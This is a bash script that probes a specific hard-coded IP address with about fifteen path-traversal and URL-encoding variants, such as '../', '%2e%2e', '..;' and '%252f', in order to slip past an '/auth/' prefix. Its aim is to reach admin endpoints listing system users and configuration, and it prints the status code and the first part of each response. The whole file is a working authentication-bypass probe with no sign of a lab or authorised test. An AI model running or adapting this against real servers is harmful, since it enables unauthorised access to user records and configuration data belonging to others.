#!/bin/bash
urls=(
"/prod-api/auth/../system/user/list?pageNum=1&pageSize=1"
"/prod-api/auth/%2e%2e/system/user/list?pageNum=1&pageSize=1"
"/prod-api/auth/..%2fsystem/user/list?pageNum=1&pageSize=1"
"/prod-api/auth/%2e%2e%2fsystem/user/list?pageNum=1&pageSize=1"
"/prod-api/auth/..;/system/user/list?pageNum=1&pageSize=1"
"/prod-api/auth/..%3b/system/user/list?pageNum=1&pageSize=1"
"/prod-api/auth/../;/system/user/list?pageNum=1&pageSize=1"
"/prod-api/auth/..%252f/system/user/list?pageNum=1&pageSize=1"
"/prod-api/./auth/../system/user/list?pageNum=1&pageSize=1"
"/prod-api//auth/../system/user/list?pageNum=1&pageSize=1"
"/prod-api/auth/%2e%2e/%2e%2e/prod-api/system/user/list?pageNum=1&pageSize=1"
"/prod-api/auth/..%5c/system/user/list?pageNum=1&pageSize=1"
"/dev-api/auth/../system/user/list?pageNum=1&pageSize=1"
"/prod-api/auth/../system/config/list?pageNum=1&pageSize=1"
"/prod-api/auth/..%2fsystem/config/list?pageNum=1&pageSize=1"
)
for u in "${urls[@]}"; do
  code=$(curl -s -o /tmp/m.$$ -w "%{http_code}" --path-as-is "http://144.123.22.234:9080$u" -H 'User-Agent: curl-probe')
  echo "URL: $u"
  echo "  HTTP=$code len=$(wc -c < /tmp/m.$$)"
  echo -n "  BODY: "; head -c 300 /tmp/m.$$ | tr -d '\n'; echo
  sleep 1.6
done
rm -f /tmp/m.$$
